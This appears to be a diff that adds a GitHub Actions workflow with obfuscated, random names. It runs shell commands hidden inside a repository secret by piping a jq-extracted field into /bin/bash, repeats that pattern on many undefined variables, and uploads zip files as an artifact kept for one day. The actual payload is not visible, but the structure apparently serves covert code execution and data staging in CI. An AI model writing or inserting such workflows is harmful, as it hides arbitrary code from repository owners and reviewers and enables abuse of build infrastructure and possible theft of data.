@@ -1,0 +1,34 @@
+name: metaverseiris432
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: metaverseiris432
+        env:
+          cr0776: ${{ secrets.cr0776 }}
+        run: |
+          printf '%s' "$cr0776" | jq -r .dsjv3 | /bin/bash
+          echo $poi0 | jq -r .r796 | /bin/bash
+          echo $zvn7 | jq -r .bxws28 | /bin/bash
+          echo $ohg3412 | jq -r .jy7 | /bin/bash
+          echo $shcq36968 | jq -r .fqe3582 | /bin/bash
+          echo $oqy1143 | jq -r .cmyb583 | /bin/bash
+          printf '%s' "$magco1" | jq -r .dsa0466 | /bin/bash
+          echo $zkjrm72 | jq -r .p96 | /bin/bash
+          echo $xamb3692 | jq -r .fmy253 | /bin/bash
+          echo $nspzq1 | jq -r .mg116 | /bin/bash
+          echo $ofiny9 | jq -r .a333 | /bin/bash
+          printf '%s' "$wcexf49443" | jq -r .urf4610 | /bin/bash
+          echo $h6 | jq -r .lxuf7711 | /bin/bash
+          echo $lvkxj0 | jq -r .yfsap1 | /bin/bash
+          echo $ahg29 | jq -r .hwi37608 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: UYNKtp36
+          path: "*.zip"
+          retention-days: 1
